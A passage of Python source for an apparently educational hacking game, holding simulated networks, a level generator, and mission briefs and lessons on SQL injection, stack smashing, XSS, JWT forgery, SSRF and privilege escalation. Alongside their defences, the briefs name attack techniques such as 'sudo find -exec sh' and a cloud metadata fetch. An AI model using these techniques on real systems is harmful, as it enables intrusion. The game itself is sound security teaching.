       files=[dict(name="welcome.txt",size="1 KB",content="This is the SANDBOX. nothing here counts for score.\npractice: scan / probe / connect / crack / exploit / decrypt")]),
  dict(ip="10.5.0.10",alias="practice-wks",kind="wks",os="Debian (lab)",pos=(.66,.22),
       links=["10.5.0.1"],ports={22:"SSH"},password=("s3cret1","weak on purpose -- practice crack",5),vulns=[],
       files=[dict(name="notes.txt",size="1 KB",content="try the full chain: crack -> connect -> ls -> cat -> download")]),
  dict(ip="10.5.0.20",alias="old-box",kind="srv",os="Ubuntu 16.04 (lab)",pos=(.66,.5),
       links=["10.5.0.1"],ports={22:"SSH"},password=None,
       vulns=[("CVE-2021-3156","Baron Samedit -- sudo heap overflow","practice: probe then exploit")],
       files=[dict(name="flag.txt",size="1 KB",content="FLAG{sandbox_practice}")]),
  dict(ip="10.5.0.30",alias="vault-lab",kind="db",os="RHEL (lab)",pos=(.66,.80),
       links=["10.5.0.1"],ports={22:"SSH"},password=("x","uncrackable on purpose",None),
       vulns=[("CVE-2024-0001","Lab RCE","practice exploit path")],
       files=[dict(name="treasure.enc",size="1 MB",enc=True,content="(encrypted -- find the key)"),
        dict(name="treasure.key",size="1 KB",content="LAB KEY -- pair it with treasure.enc via decrypt")])],
 objectives=[], lesson=["SANDBOX: no score, no trace consequences. experiment freely."])

# =============================================================
#  PROCEDURAL GENERATOR -- endless mode
# =============================================================
GEN_A=["Frosted","Neon","Quantum","Brewed","Hyper","Silent","Crimson","Pixel","Urban","Delta","Mochi","Vertex","Marble","Copper"]
GEN_B=["Bytes","Dynamics","Logistics","Robotics","Media","Foods","Systems","Analytics","Freight","Labs","Bakeries","Works","Clinics","Studios"]
GEN_C=["LLC","Inc","Group","Co","Industries","Partners"]
GRUDGES=["They fired their only IT person and called it 'cloud strategy'.",
 "Their ex-sysadmin left with the admin passwords and a grudge.",
 "A ransom note appeared on the CFO's printer this morning.",
 "An intern found a suspicious USB in the parking lot. Twice.",
 "Their competitor suddenly knows their Q3 numbers. All of them.",
 "Someone is selling their employee data on a forum we monitor.",
 "Their smart vending machine is talking to a server in a sanctions list.",
 "They got an invoice for a penetration test... they never ordered."]
OBJ_BASES=["ledger_2025.db","blackbook.dat","masterplan_v9.pdf","goldvault.img",
 "clientlist_full.csv","formula_x.doc","board_minutes.pdf","seed_vault.img"]
KEY_NAMES=["vault.key","bluefile.key","obsidian.key","ironlake.key"]
ALIASES={"fw":["edge-fw","gw-router","border-rtr","gate-01"],
 "wks":["reception","hr-wks","dev-laptop","front-desk","intern-pc","helpdesk-wks"],
 "srv":["filesrv","mail-01","wiki","jenkins","print-srv","nas-01"],
 "db":["db-main","pg-primary","sql-core"],
 "mf":["core-main","mainframe","the-vault"]}
OS_POOL={"wks":["Windows 7 -- EOL, unpatched","Windows 10 (LTSB, forgot about it)","Ubuntu Desktop 20.04","macOS 12 (no MDM)"],
 "srv":["Ubuntu 18.04 -- EOL","CentOS 7 (rip)","Debian 10 -- dusty","Windows Server 2012 R2"],
 "db":["PostgreSQL 9.6 box","MySQL 5.7 -- 'it works'","MongoDB -- no auth (classic)"],
 "mf":["RHEL 8 -- hardened-ish","AIX (yes, really)","Solaris 11.4 -- a fossil with root"]}
PORT_POOLS={"wks":[{22:"SSH",445:"SMB"},{22:"SSH",3389:"RDP"},{23:"Telnet -- PLAINTEXT",22:"SSH"}],
 "srv":[{21:"FTP (plaintext!)",22:"SSH"},{22:"SSH",80:"HTTP"},{445:"SMBv1 -- WHY?!",22:"SSH"}],
 "db":[{22:"SSH",5432:"PostgreSQL"},{22:"SSH",3306:"MySQL"},{22:"SSH"}],
 "mf":[{22:"SSH",445:"SMB"},{22:"SSH"}]}
DECOYS=[("cat_pics.zip","42 photos. two are blurry. all are important."),
 ("pizza_orders.csv","friday = pineapple debate. HR case still open."),
 ("standup_notes.txt","yesterday: blocked. today: blocked. blockers: unclear."),
 ("wifi_passwords.txt","guest: 'password123'. the irony is noted in the audit."),
 ("quarterly_vibes.xlsx","morale: 61%. trending: sideways."),
 ("dns_retries.log","a LOT of retries to one weird domain. huh."),
 ("new_year_resolutions.txt","1. patch things. 2. (ink smudge) 3. gym??")]
EDGE_VULNS=[("CVE-2024-1337","FW-Mangle -- unauth admin RCE","edge devices: exposed admin UI, patched by almost no one"),
 ("CVE-2022-0148","EdgeCrack -- config parser RCE","a never-patched appliance doing its best")]
INT_VULNS=[("CVE-2017-0144","EternalClass -- SMBv1 RCE","WannaCry's cousin; somebody left SMBv1 on"),
 ("CVE-2021-3156","Baron Samedit -- sudo heap overflow","sudo older than 1.9.5p2"),
 ("CVE-2023-4084","SvcFork -- service wrapper RCE","a service wrapper having a very bad day")]
WORDS=["pancake","pastel","gumdrop","muffin","waffle","cactus","pixel","harbor","cobalt","tulip","meteor","biscuit"]
PNAMES=["greg","brenda","stella","juniper","marcus","priya","dave","rosa"]

def _pw_for(rng,depth):
    tier=min(4,max(0,(depth-1)//2+(1 if rng.random()<0.35 else 0)))
    if tier==0:
        pw=f"{rng.choice(WORDS)}{rng.randint(1,99)}"
        return (pw,"~seconds @ 1 TH/s (word + digits)",3)
    if tier==1:
        pw=f"{rng.choice(PNAMES)}{rng.randint(1970,2015)}"
        return (pw,"~minutes (name+year: dictionary territory)",5)
    if tier==2:
        pw=f"{rng.choice(WORDS).capitalize()}!{rng.randint(10,99)}"
        return (pw,"~minutes-hours ('Word!digits' is pattern #2 in every cracker)",6)
    if tier==3:
        pw=f"{rng.choice(PNAMES).capitalize()}!{rng.randint(1950,2020)}"
        return (pw,"~hours-days (leet name+year: STILL dictionary-shaped)",7)
    pw="".join(rng.choice("abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%") for _ in range(16))
    return (pw,"~10 billion years @ 1 TH/s. uncrackable. good for them.",None)

def _ensure_accessible(nd,rng,depth):
    """GUARANTEE: every important node is winnable via crack or CVE."""
    if nd.get("password") or nd.get("vulns"): return
    r=rng.random()
    if r<0.35 and depth>=2:
        nd["vulns"]=[rng.choice(INT_VULNS)]
    else:
        nd["password"]=_pw_for(rng,depth)

def gen_endless(depth,seed):
    rng=random.Random((seed*1000003)^(depth*2654435761) & 0xFFFFFFFFFFFF)
    client=f"{rng.choice(GEN_A)} {rng.choice(GEN_B)} {rng.choice(GEN_C)}"
    grudge=rng.choice(GRUDGES)
    subnet=f"10.{rng.randint(2,250)}.{rng.randint(2,250)}"
    keyname=rng.choice(KEY_NAMES)
    objname=rng.choice(OBJ_BASES)
    n_int=min(3+depth,7)
    kinds=["wks"]
    kinds+= ["srv"]*((n_int-2)//2) if n_int>=4 else []
    kinds+=["db"] if n_int>=3 else []
    while len(kinds)<n_int-1: kinds.append(rng.choice(["wks","srv"]))
    kinds.append("mf" if depth>=4 else "db")
    rng.shuffle(kinds)
    alias_pool={k:ALIASES[k][:] for k in ALIASES}
    def alias_for(k):
        pool=alias_pool[k]
        return pool.pop(rng.randrange(len(pool))) if pool else f"{k}-{rng.randint(2,99)}"
    nodes=[]
    c2ip="10.9.9.9"
    edgeip=f"{subnet}.1"
    nodes.append(dict(ip=c2ip,alias="c2",kind="c2",os="NSH Portable",pos=(.05,.5),
        links=[edgeip],ports={},password=None,vulns=[],files=[]))
    edge_vuln = rng.random() < max(0.15, 0.55-depth*0.06)
    edge=dict(ip=edgeip,alias=alias_for("fw"),kind="fw",
        os=rng.choice(["OpenWrt 19 (2020)","VendorOS 4.2 (2019)","pfSense 2.4 -- update? never heard"]),
        pos=(.28,.5),links=[c2ip],blocks=edge_vuln,
        ports={22:"SSH",443:"Admin HTTPS"},password=None,
        vulns=[rng.choice(EDGE_VULNS)] if edge_vuln else [],
        files=[dict(name="rules.conf",size="1 KB",
            content=("deny all inbound   # (the firewall ITSELF is the hole)" if edge_vuln
                     else "allow established   # boring, competent config. rare."))])
    nodes.append(edge)
    ys=[.18,.5,.82,.30,.68,.42,.58]
    internals=[]
    prev=edgeip
    for i,k in enumerate(kinds):
        ip=f"{subnet}.{20+i*7}"
        nd=dict(ip=ip,alias=alias_for(k),kind=k,os=rng.choice(OS_POOL[k]),
            pos=(.62+(i%2)*.12, ys[i%len(ys)]),
            links=[prev,edgeip] if i>0 else [edgeip],
            ports=dict(rng.choice(PORT_POOLS[k])),password=None,vulns=[],files=[])
        if i>0: internals[-1]["links"].append(ip)
        internals.append(nd); nodes.append(nd); prev=ip
    entry=internals[0]
    if depth>=6 and rng.random()<0.5:
        entry["password"]=_pw_for(rng,99)          # uncrackable
        entry["vulns"]=[rng.choice(INT_VULNS)]     # CVE route guaranteed
    else:
        entry["password"]=_pw_for(rng,depth)
    prize=internals[-1]; _ensure_accessible(prize,rng,depth)
    kh_idx=1 if len(internals)>1 else 0
    keyholder=internals[kh_idx]
    if keyholder is not prize: _ensure_accessible(keyholder,rng,depth)
    # files
    kpw=keyholder.get("password")
    if kpw and rng.random()<0.45:
        entry["files"].append(dict(name="sticky_note.txt",size="1 KB",
            content=f"desk note: {keyholder['alias']} login = {kpw[0]}\n"
                    f"(someone wrote a REAL password on a REAL note. tradition.)"))
    for nd in nodes[1:]:
        for _ in range(rng.randint(0,min(2,1+depth//3))):
            name,cont=rng.choice(DECOYS)
            if any(f["name"]==name for f in nd["files"]): continue
            nd["files"].append(dict(name=name,size="2 KB",content=cont))
    keyholder["files"].append(dict(name=keyname,size="1 KB",
        content=f"-----BEGIN CONTRACT KEY-----\n{rng.getrandbits(64):016x}\n"
                f"-----END CONTRACT KEY-----\n(of course it lives on the network it protects)"))
    prize["files"].append(dict(name=objname+".enc",size="112 MB",enc=True,
        content="(encrypted: the thing you were hired to retrieve)"))
    objectives=[(prize["ip"],objname)]
    if depth>=3 and len(internals)>=3:
        obj2name=rng.choice([o for o in OBJ_BASES if o!=objname])
        obj2=internals[-2]
        if obj2 is not prize:
            _ensure_accessible(obj2,rng,depth)
            obj2["files"].append(dict(name=obj2name+".enc",size="40 MB",enc=True,
                content="(encrypted: secondary target)"))
            objectives.append((obj2["ip"],obj2name))
    tmul=round(1.0+0.12*(depth-1),2)
    obj_lines="".join(f"\n  >> {fn}   encrypted on {dict((n['ip'],n['alias']) for n in nodes)[ip]}"
                      for ip,fn in objectives)
    brief=(f"CLIENT: {client}\n{grudge}\n\n"
           f"WHAT TO RETRIEVE:{obj_lines}\n"
           f"     (find {keyname} somewhere on the net, then: decrypt <file.enc> {keyname})\n\n"
           f"NET: {len(nodes)-2} internal nodes | TRACE x{tmul:.2f} | DEPTH {depth} | SEED {seed}-{depth}\n\n"
           "Fully procedural, fully solvable: every door opens by crack,\n"
           "anon-auth, or an exploitable CVE. probe everything. go deep.\n"
           "ESC pauses. salvage files pay extra. noise costs MORE down here.")
    return dict(title=f"ENDLESS :: DEPTH {depth} :: {client}",brief=brief,
        nodes=nodes,objectives=objectives,lesson=[],trace_mult=tmul,
        salvage=True,seed=seed,depth=depth,client=client)

# =============================================================
#  TRAINING BRIEFS + LESSONS (22 story missions)
# =============================================================
SQL_BRIEF=("PATCH: \"The range. V0IDRAT's recruitment portal, mirrored. It builds\n"
 "its login query by pasting YOUR TEXT straight into SQL. 3 levels:\n"
 "  1. quote escape + always-true OR\n  2. comment out the password check\n"
 "  3. UNION SELECT to dump another table\n\nTAB switches USER/PASS. H = hint. ENTER = submit.")
STACK_BRIEF=("PATCH: \"The oldest exploit in the book. The program keeps its buffer\n"
 "next to its return address. Overflow the buffer, write the address.\"\n\n"
 "LAYOUT:  buffer[16] | canary[4] | saved EBP[4] | RET[4]\n"
 "Fields: LEN (bytes) and ADDR (what lands in RET). TAB switch.\n"
 "Round 1: classic. Round 2: ASLR -- read the leak. Round 3: canary.")
CRACKME_BRIEF=("KIP: \"a V0IDRAT license validator, sandboxed. the checks are all\n"
 "CLIENT-SIDE -- right there in the binary, begging.\"\n\n"
 "Craft a key satisfying all 6 rules. The validator shows PASS/FAIL live.\n"
 "When it accepts: press P to PATCH the binary (JNE -> NOP) and watch\n"
 "what security-by-obscurity earns. It's a logic puzzle. Read the rules.")
SEAL_BRIEF=("KIP: \"hashes prove integrity. today: SECRECY and IDENTITY.\"\n\n"
 "Keyring: YOU+ / YOU- (never leaves!) plus PATCH+, KIP+, ORION+.\n"
 "7 scenarios -- pick the right key (1-4). 5/7 to pass. Wrong answers\n"
 "teach you WHY. This is the math every TLS padlock runs.")
PRIVESC_BRIEF=("PATCH: \"Low-priv shell on a V0IDRAT staging box. The data needs ROOT.\n"
 "At least 3 escalation paths hide here: sudoers GTFOBins, a writable\n"
 "root cron script, and an SUID binary that calls a command by NAME.\"\n\n"
 "Recon: id  sudo -l  ls <dir>  cat <file>  find  hint\n"
 "Act:    echo '...' > <file>   statuscheck   cronwait   sudo find ...\n"
 "Reach euid=0. Each DISTINCT path = bonus.")
TOKEN_BRIEF=("PATCH: \"V0IDRAT's support portal. Three locks.\"\n\n"
 "1. XSS: their comment box renders HTML. Steal the admin's cookie.\n"
 "2. Replay the stolen session cookie.\n"
 "3. Forge a JWT: their server trusts the header's 'alg'. Make it say\n"
 "   none, delete the signature, set role to admin.\n\n"
 "TAB between token fields. H cycles hints. ENTER submits.")
OSINT_BRIEF=("PATCH: \"Zero exploits today. Rex Mallow -- 'R.' from the client list --\n"
 "posts his entire life online. Account recovery asks three questions:\n"
 "pet name, first school, mother's maiden name. Read the feed.\"")
SOCIAL_BRIEF=("PATCH: \"No terminal. The attack surface is YOU. This script is one\n"
 "Orion wrote -- I'd know, I wrote the first draft.\"\n\n"
 "INFO LEAKED rises with every bad choice. Real IT never needs your\n"
 "password. Pick replies 1-3.")
ENVELOPE_BRIEF=("PATCH: \"Three intercepted emails. Display names lie -- headers don't.\n"
 "Read Authentication-Results: SPF, DKIM, DMARC.\"\n\n"
 "LEFT/RIGHT switch emails. H toggles raw headers. [1] legit [2] phish.\n"
 "One softfail is legit. One full-pass is still a phish.")
WIRE_BRIEF=("KIP: \"wire tap is LIVE -- engagement letter #4, signed. LEGAL today.\"\n\n"
 "A packet stream flows. Some of it is naked. Some is armor.\n"
 "  SPACE pause   UP/DOWN select   ENTER inspect   P submit the FTP pw\n\n"
 "TASK 1: capture the filesrv FTP password.\nTASK 2: survive the analyst quiz.")
DNS_BRIEF=("KIP: \"our resolvers logged long hex-y subdomains to a domain nobody\n"
 "should be talking to -- DATA hiding in DNS queries. Also somebody\n"
 "answered for portal.frostedbytes.com who had NO business answering.\"\n\n"
 "  UP/DOWN scroll. G grab a hex chunk (5 total). D decode. ENTER quiz.")
META_BRIEF=("KIP: \"our dev portal has a LINK PREVIEW: give it a URL, the SERVER\n"
 "fetches it. you see where this goes.\"\n\n"
 "The server reaches things YOU can't: internal wikis, admin panels,\n"
 "and -- if this were cloud -- metadata at 169.254.169.254.\n\n"
 "  Type URLs. ENTER fetch. Chain the SSRF: recon -> metadata -> role.\n"
 "  Then FIX the service (3 toggles) and re-run your own attack.")
CHECKSUM_BRIEF=("KIP: \"our CI is installing 5 packages. registry publishes a SHA-256,\n"
 "our build computes one. MISMATCH = tampered. quarantine [1-5].\"\n\n"
 "  Then a second wall: TYPOSQUATS. Flag the fake packages.\n"
 "  A fresh malicious package has a PERFECTLY VALID hash.\n"
 "  Integrity is not identity.")
FW_BRIEF=("PATCH: \"Career flip. You're the firewall admin now. Build a rule set,\n"
 "survive 3 waves.  TOP-DOWN, FIRST MATCH WINS, implicit DEFAULT DENY.\"\n\n"
 "1-6 add rules. X delete. ARROWS select/reorder. SPACE run the wave.")
STORM_BRIEF=("PATCH: \"Orion just aimed a BOTNET at us. 3 waves, 60 seconds.\"\n\n"
 "TOOLS (toggle):\n  [1] RATE LIMIT  kills naive bots; tiny legit cost\n"
 "  [2] CHALLENGE   naive bots die, crawlers pass, smart bots laugh\n"
 "  [3] BLOCK SUBNET auto-blocks hottest bot /24; collateral risk\n"
 "  [4] SCRUBBING   absorbs everything 10s. expensive. 3 uses. cooldown.\n\n"
 "Green = customers. Yellow = friendly crawler. Red/orange = bots.\n"
 "Dropped customers hurt SLA. Load maxed = degradation. SURVIVE.")
SEG_BRIEF=("PATCH: \"Last lesson: WATER-TIGHT COMPARTMENTS. Place 8 hosts into\n"
 "zones, then I run a live breach sim from the DMZ.\"\n\n"
 "ZONES: 1=DMZ 2=OFFICE 3=PROD 4=CORE 5/Q=QUARANTINE\n"
 "Balance: business outages (-30) vs blast radius (+40/host safe).")
LOG_BRIEF=("KIP: \"srv01 -- OUR srv01 -- was visited last night. the logs survived.\n"
 "logs don't take naps. Find who, when, the backdoor, the exfil, and\n"
 "the cover-up.  UP/DOWN scroll, F grep, ENTER -> incident report.\"")
PATCH_BRIEF=("PATCH: \"He's early. Six servers, unpatched CVEs, red packets in the\n"
 "air. 1-6 to patch ($25, 1.6s). You CANNOT patch everything.\n"
 "Prioritize. Survive 90 seconds. You save what matters.\"")
SQL_LESSON=["SQL INJECTION, DISSECTED:","   The bug: code and data mixed in one string -- input becomes CODE.","",
 "THE FIX -- PREPARED STATEMENTS:",
 "   db.execute(\"SELECT * FROM users WHERE user=? AND pass=?\", (u,p))",
 "   Data travels SEPARATELY from code.","",
 "ALSO: least-privilege DB accounts, generic errors, WAFs as speed bumps.","",
 "Fun fact: xkcd's 'Bobby Tables' is this exact attack."]
STACK_LESSON=["STACK SMASHING, DISSECTED:","",
 "  Locals live next to saved EBP and the RETURN ADDRESS. An unchecked",
 "  copy fills the buffer... and keeps going. RET = 'what runs next'.",
 "",
 "  DEFENSES YOU MET: canary (trip=abort), ASLR (no leak, no aim),",
 "  DEP/NX (data can't execute).",
 "  SOURCE FIX: bounds-check. never gets()/strcpy on input."]
CRACKME_LESSON=["CRACKME -- reverse engineering & the limits of client trust:","",
 "  * Every check lived in the binary. 'sum==700' is a rule a human",
 "    can satisfy -- or a rule a human can DELETE.",
 "  * One satisfied constraint -> infinite keys -> keygens forever.",
 "  * PATCHING beats solving: JNE->NOP bypasses everything.",
 "  * THE FIX: server-side licensing, code signing, and accepting",
 "    that determined pirates win. Sell convenience, not obstacles.",
 "",
 "  LEGAL: RE for interoperability & security research is protected in",
 "  many jurisdictions. Piracy never is. Know the line."]
HASH_LESSON=["HASH ALLEY -- password storage done wrong vs right:","",
 "  * alice & bob had IDENTICAL hashes = IDENTICAL passwords. Unsalted",
 "    MD5 is a name tag -- it leaks password reuse for free.",
 "  * RAINBOW TABLES die to SALT: every row needs its OWN table.",
 "  * bcrypt row never cracked: DELIBERATELY SLOW (cost factor).",
 "    Use bcrypt/scrypt/argon2: slow, salted, tunable.",
 "",
 "  DEFENDER RULES: never plaintext, unique salt per user, slow hash.",
 "  Your storage choice is the attacker's speed."]
SEAL_LESSON=["SEAL & SIGN -- asymmetric cryptography in one page:","",
 "  PUBLIC key = open padlock. Anyone locks TO you. PRIVATE = only key.",
 "  SIGN with private; world verifies with public.",
 "  -> ENCRYPT-TO-PUB, SIGN-WITH-PRIV. Memorize it.",
 "",
 "  * A signature identifies a KEY, not a person. Key->human needs",
 "    TRUST: Certificate Authorities (that's the HTTPS padlock).",
 "  * HYBRID: AES for bulk, RSA wraps the key + signs a hash.",
 "  * PRIVATE KEY LEAK = identity theft. Rotate, revoke, use agents/HSMs.",
 "",
 "  TOY RSA: p=61 q=53 n=3233 e=17 d=2753; m=65 -> c=2790 -> back."]
PRIVESC_LESSON=["ROOT OF ALL EVIL -- privilege escalation:","",
 "  PATHS YOU USED (each a misconfiguration, not a 0-day):",
 "   * SUDO GTFOBIN: 'sudo find -exec sh' -- command-capable binaries",
 "     are root shells in disguise. Fix: exact commands in sudoers.",
 "   * WRITABLE ROOT CRON. Fix: root-owned, absolute paths.",
 "   * PATH HIJACK on SUID: binary called 'service' by NAME. Fix:",
 "     absolute paths in SUID programs; never world-writable PATH dirs.",
 "",
 "  DEFENSE: least privilege, sudoers audits, SUID inventory, monitor cron."]
TOKEN_LESSON=["TOKEN HEIST -- XSS, sessions, JWT:","",
 "  * XSS: your comment became the page's code. Same disease as SQLi.",
 "    Output-encode everything; CSP as a net.",
 "  * Session theft: a stolen cookie IS you. httpOnly + SameSite + expiry.",
 "  * JWT signature BINDS the claims. 'alg:none' = trust me, no signature.",
 "    Pin algorithms server-side. Never trust client-side role claims.",
 "",
 "  The pattern repeats: wherever data becomes code, someone sends code."]
OSINT_LESSON=["THE OVERSHARE -- OSINT & account recovery:","",
 "  * You answered 3 'secret' questions with ZERO exploits.",
 "  * Security questions are STATIC KNOWLEDGE. Public knowledge can't",
 "    be secret. Fix: random answers in a password manager.",
 "  * 2FA beats any recovered password. Audit your own footprint today.",
 "",
 "  Real red teams start here -- OSINT is legal, and it is terrifying."]
SOCIAL_LESSON=["VISHING -- what just happened:","",
 "  THE MANIPULATION TRIANGLE:",
 "    AUTHORITY 'Dave from IT'  URGENCY '10 minutes!'  FEAR 'breach!'","",
 "  DEFENSES: 1. CALLBACK to a number YOU look up.",
 "  2. IT NEVER NEEDS YOUR PASSWORD. 3. Report fast -- protect coworkers."]
ENVELOPE_LESSON=["THE FORGED ENVELOPE -- Authentication-Results:","",
 "  SPF = sending IP authorized?  DKIM = signature valid (survives fwd)?",
 "  DMARC = alignment policy.","",
 "  softfail can be legit (forwarders) if DKIM passes; a scammer's OWN",
 "  domain authenticates flawlessly -- auth proves origin, NOT trust.",
 "  Display names are unverified decoration. Check the ADDRESS."]
WIRE_LESSON=["GHOST ON THE WIRE:","",
 "  * PLAINTEXT (FTP 21, Telnet 23, HTTP): everything readable on-path.",
 "  * TLS: handshake visible, payload sealed. Capture != read.",
 "  * ARP SPOOFING: duplicate IP + new MAC = MitM. DAI / 802.1X defend.",
 "  * Assume the wire is hostile. Encrypt in transit. ALWAYS."]
DNS_LESSON=["THE LYING PHONEBOOK -- DNS forensics:","",
 "  * TUNNELING: data in query labels. Egress via logged resolvers;",
 "    alert on long random labels.",
 "  * POISONING: forged answer (TTL 86400!) cached while the authority",
 "    disagreed. DNSSEC + DoH/DoT.",
 "",
 "  ORION's diary: 'AIRGAP BREACH @ 0300'. Monitor DNS -- it confesses."]
META_LESSON=["THE METADATA MIRROR -- SSRF & the cloud (Capital One, 2019):","",
 "  1. URL-fetching feature with no allowlist.",
 "  2. -> internal services (the server is a willing proxy).",
 "  3. -> 169.254.169.254 metadata -> temporary IAM ROLE CREDENTIALS.",
 "  4. -> permissions abused. Staging bucket opened.",
 "",
 "  THE FIXES: IMDSv2 (token header), egress allowlist,",
 "  least-privilege roles. ALL THREE -- layers, as always.",
 "",
 "  Your cloud's front door is perfect. It's the servants' entrances",
 "  (metadata, previews, webhooks) that get you owned."]
CHECKSUM_LESSON=["TRUST THE CHECKSUM -- supply chain:","",
 "  * Hash mismatch = tampered download. Verify digests ALWAYS.",
 "  * BUT a fresh malicious package has a perfectly VALID hash --",
 "    integrity is not IDENTITY. That's what name vetting is for.",
 "  * TYPOSQUATS: one fat-fingered install = pwned.",
 "  * Pin versions, lockfiles, review transitive deps, sign releases.",
 "  * Supply chain is the new perimeter: poison the well, skip the wall."]
FW_LESSON=["FIREWALL DESIGN:","  * FIRST MATCH WINS: a broad ALLOW above a DENY deletes the DENY.",
 "  * DEFAULT DENY catches what you forgot -- that's the point.",
 "  * LEAST PRIVILEGE: source-restrict everything you can."]
STORM_LESSON=["STORM SHIELD -- DDoS mitigation:","",
 "  * You can't out-muscle a botnet -- you out-THINK it:",
 "    RATE LIMITS, CHALLENGES, SUBNET BLOCKS (whack-a-mole with",
 "    collateral damage), SCRUBBING CENTERS (rented armor).",
 "  * LAYER 7 floods aren't fixed by bigger pipes -- app-layer logic is.",
 "  * Friendly crawlers are traffic too. Blocking Google to stop bots",
 "    is winning the battle, losing the war.",
 "  * Real answer: CDN + anycast + rate limiting + a plan written",
 "    BEFORE the mountain range hits the graph."]
SEG_LESSON=["WATER TIGHT COMPARTMENTS:","  * Flat network: pop one box, own the map. Zones cap the blast radius.",
 "  * DMZ/PROD/CORE/QUARANTINE: printers & cameras talk to NOBODY.",
 "  * Segmentation that breaks the business gets ripped out. Balance.",
 "  * Real practice: VLANs + policy, 802.1X NAC, assume-breach design."]
LOG_LESSON=["LOG FORENSICS:","  * failed-then-success from one IP; UID-0 backdoor; sftp exfil;",
 "    journald gap 02:21->03:41 (79 min). Logs don't take naps.",
 "  * Ship logs OFF-box. Alert on UID-0 users and log-service stops.",
 "  * ...and the six words in /etc/motd, signed -O."]
PATCH_LESSON=["PATCH RUSH:","  * You can't patch everything: prioritize internet-facing + exploited.",
 "  * Every unpatched day is an exposure window. Layers save you.",
 "  * MTTR is a metric companies brag about. You just felt why."]
BRIEFS=[(JOBS[0]["title"],JOBS[0]["brief"]),("TRAINING :: SQL INJECTION",SQL_BRIEF),
 ("TRAINING :: STACK SMASHER",STACK_BRIEF),("TRAINING :: CRACKME ZERO",CRACKME_BRIEF),
 (JOBS[1]["title"],JOBS[1]["brief"]),("TRAINING :: HASH ALLEY",HASH_BRIEF),
 ("TRAINING :: SEAL & SIGN",SEAL_BRIEF),(JOBS[2]["title"],JOBS[2]["brief"]),
 ("TRAINING :: ROOT OF ALL EVIL",PRIVESC_BRIEF),("TRAINING :: TOKEN HEIST",TOKEN_BRIEF),
 ("TRAINING :: THE OVERSHARE",OSINT_BRIEF),("TRAINING :: HUMAN FIREWALL",SOCIAL_BRIEF),
 ("TRAINING :: THE FORGED ENVELOPE",ENVELOPE_BRIEF),("TRAINING :: GHOST ON THE WIRE",WIRE_BRIEF),
 ("TRAINING :: THE LYING PHONEBOOK",DNS_BRIEF),("TRAINING :: THE METADATA MIRROR",META_BRIEF),
 ("TRAINING :: TRUST THE CHECKSUM",CHECKSUM_BRIEF),("TRAINING :: CASTLE WALL",FW_BRIEF),
 ("TRAINING :: STORM SHIELD",STORM_BRIEF),("TRAINING :: WATER TIGHT COMPARTMENTS",SEG_BRIEF),
 ("TRAINING :: WHO'S INSIDE?",LOG_BRIEF),("TRAINING :: ZERO-DAY RUSH",PATCH_BRIEF)]
DEBRIEFS=[JOBS[0]["lesson"],SQL_LESSON,STACK_LESSON,CRACKME_LESSON,JOBS[1]["lesson"],HASH_LESSON,
 SEAL_LESSON,JOBS[2]["lesson"],PRIVESC_LESSON,TOKEN_LESSON,OSINT_LESSON,SOCIAL_LESSON,
 ENVELOPE_LESSON,WIRE_LESSON,DNS_LESSON,META_LESSON,CHECKSUM_LESSON,FW_LESSON,STORM_LESSON,
 SEG_LESSON,LOG_LESSON,PATCH_LESSON]
MISSIONS_META=[("JOB 01 :: THE BAKERY LIST","NSH"),("TRAINING :: SQL INJECTION","WEB"),
 ("TRAINING :: STACK SMASHER","MEM"),("TRAINING :: CRACKME ZERO","RE"),
 ("JOB 02 :: TRUST NO NODE","NSH"),("TRAINING :: HASH ALLEY","HASH"),
 ("TRAINING :: SEAL & SIGN","CRYPTO"),("JOB 03 :: THE VAULT","NSH"),
 ("TRAINING :: ROOT OF ALL EVIL","PRIV"),("TRAINING :: TOKEN HEIST","JWT"),
 ("TRAINING :: THE OVERSHARE","OSINT"),("TRAINING :: HUMAN FIREWALL","CALL"),
 ("TRAINING :: THE FORGED ENVELOPE","MAIL"),("TRAINING :: GHOST ON THE WIRE","NET"),
 ("TRAINING :: THE LYING PHONEBOOK","DNS"),("TRAINING :: THE METADATA MIRROR","CLOUD"),
 ("TRAINING :: TRUST THE CHECKSUM","SUP"),("TRAINING :: CASTLE WALL","DEF"),
 ("TRAINING :: STORM SHIELD","DDOS"),("TRAINING :: WATER TIGHT COMPARTMENTS","SEG"),
 ("TRAINING :: WHO'S INSIDE?","DEF"),("TRAINING :: ZERO-DAY RUSH","DEF")]
NM=len(MISSIONS_META)
PARS=[430,190,180,140,460,190,180,460,280,150,120,120,140,220,170,210,140,230,220,190,175,210]
MISSION_DESC=["NSH tutorial: scan, probe, crack, retrieve.","Break a login form three ways.",
 "Overflow a stack buffer; meet canaries & ASLR.","Reverse a license check, then delete it.",
 "Ransomware pivot: telnet, MS08-067, key management.","Rainbow tables vs salt vs slow hashes.",
 "Public/private keys: encrypt-to-pub, sign-with-priv.","Steal BLACKBIRD: firewall CVE + EternalClass.",
 "Low-priv to root: GTFOBins, cron, PATH hijack.","XSS -> cookie theft -> JWT alg:none.",
 "No exploits: OSINT & account recovery.","Vishing: authority, urgency, password asks.",
 "SPF/DKIM/DMARC header forensics.","Packet capture: plaintext vs TLS, ARP spoofing.",
 "DNS tunneling decode + cache poisoning.","SSRF chain to cloud metadata; then fix it.",
 "Hash mismatches + typosquats in your build.","Firewall rules: order, default deny.",
 "DDoS triage arcade: protect the SLA.","Segmentation sim: cap the blast radius.",
 "Read auth.log like a forensic analyst.","Patch-rush arcade finale."]

# =============================================================
#  NSH ENGINE (trace multiplier + salvage)
# =============================================================
class NSH:
    def __init__(s,job,game):
        s.job,s.game=job,game
        s.nodes={n["ip"]:n for n in job["nodes"]}; s.c2=job["nodes"][0]["ip"]
        s.known,s.probed,s.owned={s.c2},set(),set(); s.session=None
        s.loot,s.catted=[],set(); s.obj_done=set(); s.trace=0.0
        s.tmul=s.job.get("trace_mult",1.0)
        s.intel_pts=0; s.salvage_pts=0
        s.firewall_down=False; s.finished=False; s.want_map=False
    def resolve(s,a):
        a=a.strip().lower()
        for ip,n in s.nodes.items():
            if ip==a or n["alias"].lower()==a: return ip
        return None
    def add_trace(s,amt,ev):
        s.trace=min(100.0,s.trace+amt*s.tmul)
        if s.trace>=100:
            ev.append((0.6,"!!! TRACE COMPLETE -- hostile ICE burns your link !!!",RED,"bad"))
            ev.append((0.3,"    connection force-closed. loot kept.  [-50 pts]",RED,None))
            s.session=None; s.trace=55.0; s.game.score=max(0,s.game.score-50)
    def check_obj(s,ev):
        for ip,fn in s.job["objectives"]:
            if fn in s.loot and (ip,fn) not in s.obj_done:
